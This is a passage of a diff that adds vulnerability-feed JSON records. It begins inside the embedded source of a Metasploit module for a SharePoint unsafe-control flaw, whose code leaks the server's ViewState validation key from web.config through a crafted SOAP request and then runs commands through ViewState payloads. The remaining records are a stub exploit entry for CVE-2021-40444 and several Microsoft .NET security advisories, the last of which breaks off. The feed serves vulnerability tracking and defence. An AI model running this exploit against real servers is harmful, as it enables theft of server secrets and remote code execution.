  [\n      [Rex::Version.new('15.0.0.0'), Rex::Version.new('15.0.0.5337')], # SharePoint 2013\n      [Rex::Version.new('16.0.0.0'), Rex::Version.new('16.0.0.5149')], # SharePoint 2016\n      [Rex::Version.new('16.0.0.10000'), Rex::Version.new('16.0.0.10373')] # SharePoint 2019\n    ]\n  end\n\n  def check\n    build = sharepoint_get_version('cookie' => cookie)\n\n    if build.nil?\n      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')\n    end\n\n    if vuln_builds.any? { |build_range| build.between?(*build_range) }\n      return CheckCode::Appears(\"SharePoint #{build} is a vulnerable build.\")\n    end\n\n    CheckCode::Safe(\"SharePoint #{build} is not a vulnerable build.\")\n  end\n\n  def exploit\n    if username.blank? && password.blank?\n      if cookie.blank?\n        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')\n      end\n\n      print_warning('Using the specified COOKIE for authentication')\n    end\n\n    if (@validation_key = datastore['VALIDATION_KEY'])\n      print_status(\"Using ViewState validation key #{@validation_key}\")\n    else\n      leak_web_config\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def leak_web_config\n    print_status('Leaking the ViewState validation key...')\n\n    web_id = sharepoint_get_site_web_id('cookie' => cookie)\n    fail_with(Failure::UnexpectedReply, 'Failed to retrieve the site web ID') unless web_id\n\n    webpart = <<~WEBPART\n      <%@ Register TagPrefix=\"WebPartPages\" Namespace=\"Microsoft.SharePoint.WebPartPage\" Assembly=\"Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" %>\n      <%@ Register TagPrefix=\"att\" Namespace=\"System.Web.UI.WebControls \" Assembly=\"System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\" %>\n    WEBPART\n    webpart << Nokogiri::XML(<<-WEBPART, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n      <WebPartPages:XsltListFormWebPart id=\"id01\" runat=\"server\" ListDisplayName=\"#{datastore['SP_LIST'].encode(xml: :text)}\" WebId=\"{#{web_id.encode(xml: :text)}}\">\n        <DataSources>\n          <att:xmldatasource runat=\"server\" id=\"XDS1\"\n            XPath=\"/configuration/system.web/machineKey\"\n            datafile=\"c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config\" />\n        </DataSources>\n        <xsl>\n            <xsl:stylesheet version=\"2.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\">\n                <xsl:output method=\"xml\" indent=\"yes\" />\n                <xsl:template match=\"/\">\n                    <xsl:copy-of select=\".\" />\n                </xsl:template>\n            </xsl:stylesheet>\n        </xsl>\n      </WebPartPages:XsltListFormWebPart>\n    WEBPART\n\n    envelope = '<?xml version=\"1.0\" encoding=\"utf-8\"?>'\n    envelope << Nokogiri::XML(<<-ENVELOPE, nil, nil, Nokogiri::XML::ParseOptions::NOBLANKS).root.to_xml(indent: 0, save_with: 0)\n      <soap12:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap12=\"http://www.w3.org/2003/05/soap-envelope\">\n        <soap12:Body>\n          <RenderWebPartForEdit xmlns=\"http://microsoft.com/sharepoint/webpartpages\">\n            <webPartXml>#{webpart.encode(xml: :text)}</webPartXml>\n          </RenderWebPartForEdit>\n        </soap12:Body>\n      </soap12:Envelope>\n    ENVELOPE\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx'),\n      'cookie' => cookie,\n      'ctype' => 'application/soap+xml; charset=utf-8',\n      'data' => envelope\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    unless res.code == 200\n      fail_with(Failure::NotFound, \"Failed to retrieve #{normalize_uri(target_uri.path, '_vti_bin', 'WebPartPages.asmx')}\")\n    end\n\n    xml_response = res.get_xml_document\n    if xml_response.nil?\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (non-XML response body)')\n    end\n\n    xml_result = xml_response.xpath('//wpp:RenderWebPartForEditResult', XML_NS)&.text\n    unless xml_result\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //wpp:RenderWebPartForEditResult)')\n    end\n\n    xml_result = Nokogiri::XML(xml_result)\n    web_part_pages = Nokogiri::XML(xml_result.xpath('//Properties').text)\n    unless web_part_pages&.root\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //Properties)')\n    end\n\n    unless (preview = web_part_pages.root.attr('__designer:Preview'))\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing attribute: __desiginer:Preview)')\n    end\n    preview = Nokogiri::HTML(CGI.unescapeHTML(preview))\n    unless (@validation_key = preview.at('//machinekey/@validationkey')&.text)\n      fail_with(Failure::NotFound, 'Failed to extract the ViewState validation key (missing xpath: //machinekey/@validationkey)')\n    end\n\n    print_good(\"ViewState validation key: #{@validation_key}\")\n  end\n\n  def execute_command(cmd, _opts = {})\n    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' => cookie })\n  end\nend\n",
+            "cvss": {
+                "score": 8.8,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "sourceHref": "https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/windows/http/sharepoint_unsafe_control.rb",
+            "vhref": "https://vulners.com/metasploit/MSF:EXPLOIT-WINDOWS-HTTP-SHAREPOINT_UNSAFE_CONTROL-"
+        },
+        {
+            "lastseen": "2024-08-14T12:31:57",
+            "bulletinFamily": "exploit",
+            "cvelist": [
+                "CVE-2021-40444"
+            ],
+            "description": "# CVE-2021-40444\n\n## Usage\n\nEnsure to run `setup.sh` first as yo...",
+            "modified": "2024-08-12T20:16:55",
+            "id": "9366C7C7-BF57-5CFF-A1B5-8D8CF169E72A",
+            "published": "2021-10-03T01:13:42",
+            "href": "",
+            "type": "githubexploit",
+            "title": "Exploit for Path Traversal in Microsoft",
+            "cvss": {
+                "score": 8.8,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L",
+                "version": "3.1"
+            },
+            "privateArea": 1,
+            "vhref": "https://vulners.com/githubexploit/9366C7C7-BF57-5CFF-A1B5-8D8CF169E72A"
+        },
+        {
+            "lastseen": "2024-08-20T16:53:41",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-38081"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-38081 | .NET Denial of Service Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET 6.0 . This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA Vulnerability exist in Visual Studio installer on Windows OS where an unprivileged user is allowed to manipulate the Visual Studio installation resulting in elevation of privilege.\n\n## Announcement\n\nAnnouncement for this issue can be found at  https://github.com/dotnet/announcements/issues/313\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 6.0 application running on .NET 6.0.31 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 6\"></a>.NET 6\n\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[Microsoft.IO.Redist](https://www.nuget.org/packages/Microsoft.IO.Redist)               |  >=4.6.0-preview.18571.3, <=6.0.0 | 6.0.1\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 7.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 6.0, you should download and install Runtime 6.0.32 or SDK 6.0.132 (for Visual Studio 2022 v17.4) from https://dotnet.microsoft.com/download/dotnet-core/7.0.\n\n.NET 6.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 7.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-38081]( https://vulners.com/cve/CVE-2024-38081)\n\n### Revisions\n\nV1.0 (July 09, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-07-09_",
+            "modified": "2024-08-20T08:13:42",
+            "id": "OSV:GHSA-HQ7W-XV5X-G34J",
+            "published": "2024-07-09T21:14:35",
+            "href": "https://osv.dev/vulnerability/GHSA-hq7w-xv5x-g34j",
+            "type": "osv",
+            "title": "Microsoft Security Advisory CVE-2024-38081 | .NET Denial of Service Vulnerability",
+            "cvss": {
+                "score": 7.3,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/osv/OSV:GHSA-HQ7W-XV5X-G34J"
+        },
+        {
+            "lastseen": "2024-08-18T06:08:17",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-38168"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-38168 | .NET Denial of Service Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA vulnerability exists in .NET when an attacker through unauthenticated requests may trigger a Denial of Service in ASP.NET HTTP.sys web server. This is a windows OS only vulnerability.\n\n## Announcement\n\nAnnouncement for this issue can be found at  https://github.com/dotnet/announcements/issues/320\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 8.0 application running on .NET 8.0.7 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[Microsoft.AspNetCore.App.Runtime.win-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.8  Runtime or .NET 8.0.108 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n\n.NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0  or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-38168]( https://vulners.com/cve/CVE-2024-38168)\n\n### Revisions\n\nV1.0 (August 13, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-08-13_",
+            "modified": "2024-08-17T08:12:10",
+            "id": "OSV:GHSA-7QRV-8F9X-3H32",
+            "published": "2024-08-13T19:27:23",
+            "href": "https://osv.dev/vulnerability/GHSA-7qrv-8f9x-3h32",
+            "type": "osv",
+            "title": "Microsoft Security Advisory CVE-2024-38168 | .NET Denial of Service Vulnerability",
+            "cvss": {
+                "score": 7.5,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/osv/OSV:GHSA-7QRV-8F9X-3H32"
+        },
+        {
+            "lastseen": "2024-08-16T12:14:23",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-38168"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-38168 | .NET Denial of Service Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA vulnerability exists in .NET when an attacker through unauthenticated requests may trigger a Denial of Service in ASP.NET HTTP.sys web server. This is a windows OS only vulnerability.\n\n## Announcement\n\nAnnouncement for this issue can be found at  https://github.com/dotnet/announcements/issues/320\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 8.0 application running on .NET 8.0.7 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[Microsoft.AspNetCore.App.Runtime.win-arm](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.AspNetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.AspNetCore.App.Runtime.win-x86)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.8  Runtime or .NET 8.0.108 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n\n.NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0  or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any kind. Microsoft disclaims all warranties, either express or implied, including the warranties of merchantability and fitness for a particular purpose. In no event shall Microsoft Corporation or its suppliers be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if Microsoft Corporation or its suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation may not apply.\n\n### External Links\n\n[CVE-2024-38168]( https://vulners.com/cve/CVE-2024-38168)\n\n### Revisions\n\nV1.0 (August 13, 2024): Advisory published.\n\n_Version 1.0_\n\n_Last Updated 2024-08-13_",
+            "modified": "2024-08-13T19:28:24",
+            "id": "GHSA-7QRV-8F9X-3H32",
+            "published": "2024-08-13T19:27:23",
+            "href": "https://github.com/advisories/GHSA-7qrv-8f9x-3h32",
+            "type": "github",
+            "title": "Microsoft Security Advisory CVE-2024-38168 | .NET Denial of Service Vulnerability",
+            "cvss": {
+                "score": 7.5,
+                "severity": "HIGH",
+                "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+                "version": "3.1"
+            },
+            "vhref": "https://vulners.com/github/GHSA-7QRV-8F9X-3H32"
+        },
+        {
+            "lastseen": "2024-08-18T06:08:18",
+            "bulletinFamily": "software",
+            "cvelist": [
+                "CVE-2024-38167"
+            ],
+            "description": "# Microsoft Security Advisory CVE-2024-38167 | .NET Information Disclosure Vulnerability\n\n## <a name=\"executive-summary\"></a>Executive summary\n\nMicrosoft is releasing this security advisory to provide information about a vulnerability in  .NET 8.0. This advisory also provides guidance on what developers can do to update their applications to remove this vulnerability.\n\nA vulnerability exists in .NET runtime TlsStream which may result in Information Disclosure.\n\n## Discussion\n\nDiscussion for this issue can be found at  https://github.com/dotnet/runtime/issues/106359\n\n## <a name=\"mitigation-factors\"></a>Mitigation factors\n\nMicrosoft has not identified any mitigating factors for this vulnerability.\n\n## <a name=\"affected-software\"></a>Affected software\n\n* Any .NET 8.0 application running on .NET 8.0.7 or earlier.\n\n## <a name=\"affected-packages\"></a>Affected Packages\nThe vulnerability affects any Microsoft .NET Core project if it uses any of affected packages versions listed below\n\n### <a name=\".NET 8\"></a>.NET 8\nPackage name | Affected version | Patched version\n------------ | ---------------- | -------------------------\n[Microsoft.NetCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-arm)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-arm64)           | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-arm)     | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-arm64) | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-musl-x64)     | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.linux-x64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.osx-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.osx-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-arm](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-arm)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-arm64)               | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-x64)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n[Microsoft.NetCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NetCore.App.Runtime.win-x86)                   | >= 8.0.0, < 8.0.8 | 8.0.8\n\n\n\n## Advisory FAQ\n\n### <a name=\"how-affected\"></a>How do I know if I am affected?\n\nIf you have a runtime or SDK with a version listed, or an affected package listed in [affected software](#affected-packages) or [affected packages](#affected-software), you're exposed to the vulnerability.\n\n### <a name=\"how-fix\"></a>How do I fix the issue?\n\n* To fix the issue please install the latest version of .NET 8.0 or .NET 6.0. If you have installed one or more .NET SDKs through Visual Studio, Visual Studio will prompt you to update Visual Studio, which will also update your .NET  SDKs.\n* If you have .NET 6.0 or greater installed, you can list the versions you have installed by running the `dotnet --info` command. You will see output like the following;\n\n```\n.NET Core SDK (reflecting any global.json):\n\n\n Version:   8.0.200\n Commit:    8473146e7d\n\nRuntime Environment:\n\n OS Name:     Windows\n OS Version:  10.0.18363\n OS Platform: Windows\n RID:         win10-x64\n Base Path:   C:\\Program Files\\dotnet\\sdk\\6.0.300\\\n\nHost (useful for support):\n\n  Version: 8.0.3\n  Commit:  8473146e7d\n\n.NET Core SDKs installed:\n\n  8.0.200 [C:\\Program Files\\dotnet\\sdk]\n\n.NET Core runtimes installed:\n\n  Microsoft.AspAspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspAspNetCore.App]\n  Microsoft.AspNetCore.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.AspNetCore.App]\n  Microsoft.WindowsDesktop.App 8.0.3 [C:\\Program Files\\dotnet\\shared\\Microsoft.WindowsDesktop.App]\n\n\nTo install additional .NET Core runtimes or SDKs:\n  https://aka.ms/dotnet-download\n```\n\n* If you're using .NET 8.0, you should download and install .NET 8.0.8  Runtime or .NET 8.0.108 SDK (for Visual Studio 2022 v17.8) from https://dotnet.microsoft.com/download/dotnet-core/8.0.\n\n.NET 8.0 updates are also available from Microsoft Update. To access this either type \"Check for updates\" in your Windows search, or open Settings, choose Update & Security and then click Check for Updates.\n\nOnce you have installed the updated runtime or SDK, restart your apps for the update to take effect.\n\nAdditionally, if you've deployed [self-contained applications](https://docs.microsoft.com/dotnet/core/deploying/#self-contained-deployments-scd) targeting any of the impacted versions, these applications are also vulnerable and must be recompiled and redeployed.\n\n## Other Information\n\n### Reporting Security Issues\n\nIf you have found a potential security issue in .NET 8.0 or .NET 6.0, please email details to secure@microsoft.com. Reports may qualify for the Microsoft .NET Core & .NET 5 Bounty. Details of the Microsoft .NET Bounty Program including terms and conditions are at <https://aka.ms/corebounty>.\n\n### Support\n\nYou can ask questions about this issue on GitHub in the .NET GitHub organization. The main repos are located at https://github.com/dotnet/runtime and https://github.com/dotnet/aspnet/. The Announcements repo (https://github.com/dotnet/Announcements) will contain this bulletin as an issue and will include a link to a discussion issue. You can ask questions in the linked discussion issue.\n\n### Disclaimer\n\nThe information provided in this advisory is provided \"as is\" without warranty of any 